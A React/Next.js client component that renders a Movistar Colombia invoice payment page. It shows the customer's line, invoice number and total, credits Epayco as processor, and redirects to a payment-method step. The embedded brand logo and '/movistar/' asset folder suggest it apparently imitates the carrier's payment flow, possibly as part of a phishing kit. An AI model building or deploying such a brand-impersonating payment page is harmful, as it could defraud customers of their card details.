"use client";

import { useState } from "react";

const MOVISTAR_LOGO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADUAAAAlCAYAAADiMKHrAAAAAXNSR0IArs4c6QAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAANaADAAQAAAABAAAAJQAAAACkUbpIAAAEbUlEQVRYCc1ZXXLbNhDeBf3SkTzxDerewDmB6RNYOUGkifuc3MDKCao+RxrJJ7B7gjg3UG7QnqDuWGpfQiLfLkWRIgGKIqnG8IwJLrCL/bA/WEJML7nN/zunOLolS+fMFFqyT+g/EvED3fTvfKqzb+CH0uf2jKLVnJkHPj2sgAt6b2jET8U5Lw/UfHVBEQEQXRSVLb4D2BLArorATHHiD30XC8X2cx1AoqfOi9aTos5+S6kLrK8Jviw+rYyMnYntH/Tr6WNRUCfv0+f7KpfzrWFje5XXyQ1qunpLbCdMfOYSlJidRjTqL13jjWjT9YDZ3jfh1fi66V+lvGX3m0mA0sIHSBjV7HATEv/vrNn3TUVBn5AkU27aLqjZ6gNMN0wHq54Kuitgn55DVaxqwX1j8bdhOiUDhV0HoN/SgTrPDBgCvE1jvm3DrryWr1MZGajoMECpAAUWrRvFgsqA27S2EgRpSEhyQ0tAiZXELxs25Z09jxuxR1EzPtdi0b+hkBNQUb04cslJabDY7cGJQ3aW7dZtUlmNnxxr4kpAMXUjGJXAQQrF66G670FMlZNDGTWyu0gQ5/LStqlfH+aG7+uuiWL2i7U4+Gs0Q/H+GquGnO0UdUOk6C3B15mtYKX9m4mD9S9r6DW9Ow3p5nRgTfALwP3jEou1L4VuUAJ1eIBuljJ0XxlfSZbam8ZV+aB3sVO5jH76E6luvFnJ+TAI1M5BaZzIweyymNaUqFpqWAkbPihW4Ioitksnmg3xpGqwzZgCM/TZTp8fiM2SpBgWr4hRtbC7psyvB7e7yxep+TE6Qc0Zr3dI2xetTmYruyW8oI7EDomreRp79JaKPUnpHkag/So75gtMD1trslqpAlDlAif85HU/TZ/INioApYyNvi3hNq8qBXY1aO2iUpQrVlMGfA5VWMpkgmXXJGj/hyYp3BtLNdc34mLOuTZ+2qHjaxcL/r5DO8YL06StWFgK106uxuasRA5646PHlwkeSusWCYbCIknepeqQJw5fXkqn1DbF4Q5drqOYP+zQOnxRr2maIHJ64PDF+eFqvkrjXX+R7oiLrSVtUYvf8rln3qPQDf7coJguPYzgOpK16rieKuX50o7l9lZAIQW64kQrAtzwqIziP+XpNmkc5HrMj0WV8llzk9JxN+1s1g1K5mrSQPrtrk1qizI9hECWtRVQkB05CShOzFYSWvVVKkmDunFD9RTT82xsSSvSItf0QgAbWctvsME7lTyKZTRUzhyv/3awU/H2szQHBSsqjesS/QACEs9HfC+ND2CpnJpYCruuZZFrasUvDzo96A/V/C7eGjR1ow4ByZKbmNLuQv472qWDlpHEDeHPTYApILhRJqybXgbqpvfgUkzvHfatJXfq8GuvtR38WOuOBJDGpmNCC9Julc40hqx5Xp4r3efHt/1EuYGVCpp5CHqIDfl5O46OHtpSwQTBpOpbKc/TpJ8kijzndLWAMm9TUtdBnMo95rMMSlaTXzNinFFyQh/rt6gjovoOniWdTPDeht8AAAAASUVORK5CYII=";

function formatCOP(n: number): string {
  return n.toLocaleString("es-CO", { style: "currency", currency: "COP", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

type Props = {
  id: string;
  facturaId: string;
  total: number;
  factura_documento: string;
  nombre: string;
  expiracion: string;
  telefono: string;
};

export default function DetailClient(props: Props) {
  const {
    facturaId,
    total,
    factura_documento,
    nombre,
    telefono,
  } = props;
  const [loading, setLoading] = useState(false);

  const totalFormateado = formatCOP(total);

  function siguiente() {
    setLoading(true);
    window.location.href = "/pago/metodo";
  }

  function regresar() {
    setLoading(true);
    window.location.href = "/";
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <img src="/movistar/M.gif" alt="Cargando" className="w-48" />
      </div>
    );
  }

  return (
    <div>
      {/* Header */}
      <div className="w-full mx-auto bg-white shadow-md z-50 py-5">
        <div className="flex flex-row flex-wrap justify-between items-center">
          <img src={MOVISTAR_LOGO} alt="Movistar" className="h-6 w-auto ml-6 md:h-10" />
          <p className="flex items-center text-xs md:text-sm mr-6">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="currentColor"
              className="size-3 mr-1"
            >
              <path
                fillRule="evenodd"
                d="M12 1.5a5.25 5.25 0 0 0-5.25 5.25v3a3 3 0 0 0-3 3v6.75a3 3 0 0 0 3 3h10.5a3 3 0 0 0 3-3v-6.75a3 3 0 0 0-3-3v-3c0-2.9-2.35-5.25-5.25-5.25Zm3.75 8.25v-3a3.75 3.75 0 1 0-7.5 0v3h7.5Z"
                clipRule="evenodd"
              />
            </svg>
            Pagos procesados por
            <img src="/movistar/30.png" alt="Epayco" className="h-4 ml-1" />
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-5 max-w-7xl">
        <div className="w-full md:w-5/6 lg:w-3/4 mx-auto">
          {/* User Info */}
          <div className="flex flex-row items-center my-4">
            <img src="/movistar/29.svg" alt="User" className="w-40 mr-4" />
            <div>
              <p className="font-medium">{nombre}</p>
              <p className="text-sm text-gray-600">Número de línea {telefono}</p>
              <p className="text-xs text-gray-500">Referencia de pago {facturaId}</p>
            </div>
          </div>

          {/* Invoice Info */}
          <div className="text-center py-4">
            <p className="font-medium">Información de tu factura</p>
            <p className="text-sm text-gray-600">Factura No.{factura_documento}</p>
          </div>

          {/* Payment Summary */}
          <div className="border-b-2 border-dark-blue mb-4 text-sm mt-6">
            <div className="flex justify-between items-center py-3">
              <div className="flex items-center">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                  className="size-6 mr-1 text-[#029cf5]"
                >
                  <path
                    fillRule="evenodd"
                    d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12Zm13.36-1.814a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z"
                    clipRule="evenodd"
                  />
                </svg>
                <p className="font-medium">Total a pagar</p>
              </div>
              <p className="font-semibold text-sm">{totalFormateado}</p>
            </div>

            <div className="flex justify-between items-center py-3 pl-5">
              <div className="flex items-center">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                  className="size-6 mr-1 text-[#029cf5]"
                >
                  <path
                    fillRule="evenodd"
                    d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12Zm13.36-1.814a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z"
                    clipRule="evenodd"
                  />
                </svg>
                <p className="text-gray-700">Total</p>
              </div>
              <p className="font-semibold">{totalFormateado}</p>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-col md:flex-row gap-4 py-3">
            <button
              onClick={regresar}
              className="w-full bg-white text-dark-blue text-sm rounded-full px-4 py-3 border border-gray-200 hover:shadow-md transition-all duration-500"
            >
              Cancelar
            </button>
            <button
              onClick={siguiente}
              className="w-full bg-[#0B2739] text-white rounded-full text-sm px-4 py-3 transition-all duration-500"
            >
              Pagar
            </button>
          </div>

          {/* Payment Info */}
          <div className="border rounded-lg p-3 my-4 text-sm">
            <p>
              Envía <span className="font-semibold">FACTURA</span> como mensaje de texto al 85202
              desde tu línea móvil <span className="font-semibold">Movistar</span> y conoce el{" "}
              <span className="font-semibold">detalle de tu pago.</span>
            </p>
          </div>

          {/* Payment Processors */}
          <div className="text-center pt-4">
            <p className="text-sm">
              Pagos procesados por{" "}
              <img src="/movistar/30.png" alt="Epayco" className="h-5 ml-1 inline" />
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
